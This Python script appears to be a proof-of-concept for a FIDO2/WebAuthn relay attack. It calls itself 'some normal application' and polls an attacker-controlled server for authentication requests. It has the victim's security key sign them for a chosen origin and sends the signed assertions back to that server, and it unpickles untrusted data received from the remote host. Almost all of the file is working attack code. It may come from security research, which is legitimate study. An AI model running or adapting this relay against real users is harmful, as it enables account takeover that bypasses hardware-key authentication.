from __future__ import print_function, absolute_import, unicode_literals
import requests
from fido2.hid import CtapHidDevice
from fido2.ctap import CtapError, STATUS
from fido2.client import Fido2Client, WindowsClient, UserInteraction
from fido2.server import Fido2Server
from getpass import getpass
import sys
import ctypes
import os
from fido2.webauthn import PublicKeyCredentialRpEntity, PublicKeyCredentialUserEntity
from fido2 import cbor
import base64
import json
import pickle
import time

attackerurl='https://fidotest.eastus.cloudapp.azure.com'


class CliInteraction(UserInteraction):
	def prompt_up(self):
		print("\nTouch your authenticator device now...\n")

	def request_pin(self, permissions, rd_id):
		return getpass("Enter PIN: ")

	def request_uv(self, permissions, rd_id):
		print("User Verification required.")
		return True

def runauth(optdatab64):
	optdata=pickle.loads(base64.b64decode(optdatab64.encode()))
	optionsb64=optdata['optionsb64']
	origin=optdata['url']
	options=pickle.loads(base64.b64decode(optionsb64.encode()))
	if WindowsClient.is_available() and not ctypes.windll.shell32.IsUserAnAdmin():
		client = WindowsClient(origin)
	else:
		dev = next(CtapHidDevice.list_devices(), None)
		if dev is not None:
			print("Use USB HID channel.")
		else:
			try:
				from fido2.pcsc import CtapPcscDevice
				dev = next(CtapPcscDevice.list_devices(), None)
				print("Use NFC channel.")
			except Exception as e:
				print("NFC channel search error:", e)
		if not dev:
			print("No FIDO device found")
			sys.exit(1)
		client = Fido2Client(dev, origin, user_interaction=CliInteraction())
	result = client.get_assertion(options)
	result = result.get_response(0)
	credid=result.credential_id
	clntdata=result.client_data
	authdata=result.authenticator_data
	sign=result.signature
	tp=clntdata.type
	chal=clntdata.challenge
	chalb64=base64.urlsafe_b64encode(chal).decode()
	chalb64=chalb64.strip("=")
	orig=clntdata.origin
	clntDatarr=barrToArr(clntdata)
	rpidhash=authdata.rp_id_hash
	adat=barrToArr(rpidhash)
	adat.append(authdata.flags)
	counter=authdata.counter.to_bytes(4)
	for xx in counter:
		adat.append(xx)
	resp={}
	resp['authenticatorData']=adat
	resp['clientDataJSON']=clntDatarr
	resp['signature']=barrToArr(sign)
	resp['userHandle']=barrToArr(result.user_handle)
	#print(sign)
	pkcred={}
	pkcred['authenticatorAttachment']='platform'
	pkcred['rawId']=barrToArr(credid)
	pkcred['id']=base64.urlsafe_b64encode(credid).decode().strip("=")
	pkcred['type']='public-key'
	pkcred['response']=resp
	return base64.b64encode(pickle.dumps(pkcred)).decode()

def barrToArr(barr):
	arr=[x for x in barr]
	return arr

def run():
	resp1=requests.get(attackerurl+"/victimreq")
	txt1=resp1.text
	if txt1=="":
		return
	pkcred=runauth(txt1)
	resp2=requests.post(attackerurl+"/victimresp", data={'ccddata':pkcred})
	txt2=resp2.text
	if txt2!="success":
		return
		
def main():
	print("Lets assume this is some normal application.")
	while True:
		time.sleep(1)
		try:
			run()
		except:
			pass
			
if __name__=="__main__":
	main()
